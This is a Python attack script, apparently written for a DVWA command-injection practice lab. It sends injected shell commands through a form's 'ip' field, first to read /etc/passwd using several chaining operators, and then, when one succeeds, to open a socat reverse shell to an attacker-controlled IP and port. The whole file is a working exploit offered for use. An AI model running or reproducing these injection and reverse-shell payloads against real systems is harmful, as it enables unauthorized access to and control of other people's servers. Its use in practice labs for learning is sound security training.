##Created by Kwang
#!/usr/bin/env python
import requests
import subprocess

target_url = 'http://127.0.0.1/vulnerabilities/exec/'
#Change your ip and port and create a nc listener
reverse_shell_ip = '192.168.45.193'
reverse_shell_port = '1234'

cookies = {
    'PHPSESSID': '',
    'security': 'low',
}

payloads = [
    '; cat /etc/passwd',  # Semi-colon operator
    '&& cat /etc/passwd',  # Logical AND operator
    '|| cat /etc/passwd',  # Logical OR operator
    '| cat /etc/passwd',  # Pipe operator
]

for payload in payloads:
    data = {
        'ip': payload,
        'Submit': 'Submit',
    }
    response = requests.post(target_url, cookies=cookies, data=data)
    #take out the operator
    operator = payload.split()[0]

    if 'root' in response.text:
        print(f'Operator "{payload.split()[0]}" executed successfully.')
        print('Creating a revershell... check your listener')
        reverse_shell_payload = f"{operator} socat tcp-connect:{reverse_shell_ip}:{reverse_shell_port} exec:bash,pty,stderr,setsid,sigint,sane"

        # Send the payload with the reverse shell command
        reverse_shell_data = {
            'ip': reverse_shell_payload,
            'Submit': 'Submit',
        }
        reverse_shell_response = requests.post(target_url, cookies=cookies, data=reverse_shell_data)
        
    else:
        print(f'Operator "{payload.split()[0]}" failed to execute.')
